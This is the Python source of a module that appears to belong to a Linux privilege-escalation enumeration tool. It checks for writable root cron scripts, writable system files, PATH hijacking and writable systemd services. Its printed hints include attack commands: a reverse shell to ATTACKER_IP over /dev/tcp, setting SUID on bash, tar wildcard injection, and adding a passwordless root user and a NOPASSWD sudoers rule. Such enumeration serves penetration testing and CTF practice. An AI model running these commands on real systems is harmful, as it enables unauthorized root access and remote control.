"""
Cron Jobs & Writable Files Module
Checks:
- Cron jobs running as root with writable scripts
- Writable /etc/passwd, /etc/shadow, /etc/sudoers
- World-writable directories in PATH
- Writable service files (systemd)
- Wildcard injection in cron (tar, chown, chmod with *)
"""

import os
import re
from LD_PRELOAD.utils.output import print_found, print_info, print_warn, print_critical, run_cmd


def check_cron_jobs() -> list:
    """
    Find all cron jobs — focus on root cron jobs with writable scripts.
    This is a very common CTF/real-world privesc.
    """
    findings = []

    cron_locations = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/cron.hourly/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/",
        "/var/spool/cron/",
        "/var/spool/cron/crontabs/",
        "/var/spool/cron/crontabs/root",
    ]

    all_cron_content = ""

    for loc in cron_locations:
        content = run_cmd(f"cat '{loc}' 2>/dev/null || ls -la '{loc}' 2>/dev/null")
        if content and "No such file" not in content:
            all_cron_content += f"\n# {loc}\n{content}"
            print_info(f"[CRON] Found: {loc}")

    # Also check running cron processes
    ps_output = run_cmd("ps aux | grep -i cron | grep -v grep")
    if ps_output:
        print_info(f"[CRON] Running: {ps_output.strip()[:100]}")

    # Parse and analyze cron entries
    for line in all_cron_content.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # Find lines that execute scripts
        # Format: * * * * * root /path/to/script.sh
        script_match = re.search(r'(/[^\s]+\.(sh|py|pl|rb|php|bash))', line)
        cmd_match    = re.search(r'(\d+|\*)\s+(\d+|\*)\s+(\d+|\*)\s+(\d+|\*)\s+(\d+|\*)\s+(\w+)\s+(.+)', line)

        if cmd_match or script_match:
            # Check if the script/command is writable
            if script_match:
                script_path = script_match.group(1)
                if os.access(script_path, os.W_OK):
                    findings.append({
                        "type": "writable_cron_script",
                        "cron_line": line,
                        "script": script_path,
                    })
                    print_critical(
                        f"[CRON] 🚨 WRITABLE cron script: {script_path}\n"
                        f"         → Add: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' or 'chmod +s /bin/bash'"
                    )
                else:
                    print_found(f"[CRON] Script: {script_path}")

            # Check for wildcard injection
            if re.search(r'(tar|chown|chmod|rsync)\s+.*\*', line):
                findings.append({"type": "wildcard_injection", "cron_line": line})
                print_critical(
                    f"[CRON] 🚨 WILDCARD INJECTION possible: {line}\n"
                    f"         → Create files: --checkpoint=1 --checkpoint-action=exec=sh shell.sh"
                )

            # Check if cron script's directory is writable
            if script_match:
                script_dir = os.path.dirname(script_match.group(1))
                if os.access(script_dir, os.W_OK):
                    findings.append({"type": "writable_cron_dir", "dir": script_dir})
                    print_critical(f"[CRON] 🚨 Cron script directory is WRITABLE: {script_dir}")

    return findings


def check_writable_critical_files() -> list:
    """
    Check if critical system files are writable.
    If /etc/passwd is writable you can add a root user directly!
    """
    findings = []

    critical_files = {
        "/etc/passwd":          "Add root user: echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd",
        "/etc/shadow":          "Replace root hash with known hash",
        "/etc/sudoers":         "Add: 'ALL ALL=(ALL) NOPASSWD: ALL'",
        "/etc/sudoers.d/":      "Create new sudoers file",
        "/etc/hosts":           "DNS poisoning — redirect traffic",
        "/etc/ld.so.conf":      "Library preload hijacking",
        "/etc/ld.so.conf.d/":   "Library preload hijacking",
        "/etc/environment":     "Set env variables for all users",
        "/etc/profile":         "Execute code on login",
        "/etc/profile.d/":      "Execute code on login",
        "/etc/bash.bashrc":     "Execute code on bash startup",
        "/etc/rc.local":        "Execute code at boot",
        "/etc/crontab":         "Add cron job as root",
        "/etc/init.d/":         "Modify init scripts",
        "/lib/systemd/system/": "Modify systemd service files",
        "/etc/systemd/system/": "Modify systemd service files",
    }

    for path, exploit_desc in critical_files.items():
        if os.access(path, os.W_OK):
            findings.append({"path": path, "exploit": exploit_desc})
            print_critical(f"[WRITE] 🚨 WRITABLE: {path}")
            print_critical(f"         → {exploit_desc}")

    return findings


def check_path_hijacking() -> list:
    """
    Check for writable directories in PATH.
    If a directory in PATH is writable, create a malicious binary
    with the same name as a command run by root.
    """
    findings = []
    path_env = os.environ.get("PATH", "").split(":")
    print_info(f"[PATH] Current PATH: {os.environ.get('PATH', '')}")

    for directory in path_env:
        if not directory:
            continue
        if os.access(directory, os.W_OK):
            findings.append(directory)
            print_critical(
                f"[PATH] 🚨 Writable PATH directory: {directory}\n"
                f"         → Create malicious binary here with same name as root's cron/service commands"
            )

    # Check for relative paths in PATH (.)
    if "." in path_env or "" in path_env:
        print_critical("[PATH] 🚨 Current directory '.' in PATH — PATH hijacking trivial!")

    return findings


def check_systemd_services() -> list:
    """
    Find writable systemd service files running as root.
    Modify the ExecStart to get a shell.
    """
    findings = []

    service_dirs = [
        "/etc/systemd/system/",
        "/lib/systemd/system/",
        "/usr/lib/systemd/system/",
    ]

    for sdir in service_dirs:
        output = run_cmd(f"ls '{sdir}' 2>/dev/null")
        for service in output.split("\n"):
            service = service.strip()
            if not service.endswith(".service"):
                continue
            full_path = os.path.join(sdir, service)
            if os.access(full_path, os.W_OK):
                # Check if running as root
                content = run_cmd(f"cat '{full_path}' 2>/dev/null")
                if "User=" not in content or "User=root" in content:
                    findings.append(full_path)
                    print_critical(
                        f"[SERVICE] 🚨 Writable service file: {full_path}\n"
                        f"           → Edit ExecStart=/bin/bash -c 'chmod +s /bin/bash'\n"
                        f"           → Then: systemctl daemon-reload && systemctl restart {service}"
                    )

    return findings


def check_writable_log_files() -> list:
    """Check for writable log files — log poisoning / LFI escalation."""
    findings = []
    log_files = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/tmp/",
        "/var/tmp/",
    ]
    for f in log_files:
        if os.access(f, os.W_OK):
            findings.append(f)
            print_found(f"[LOG] Writable: {f}")
    return findings


def run() -> dict:
    print_info("Checking cron jobs and writable files...")
    return {
        "cron":           check_cron_jobs(),
        "writable_files": check_writable_critical_files(),
        "path_hijack":    check_path_hijacking(),
        "services":       check_systemd_services(),
        "logs":           check_writable_log_files(),
    }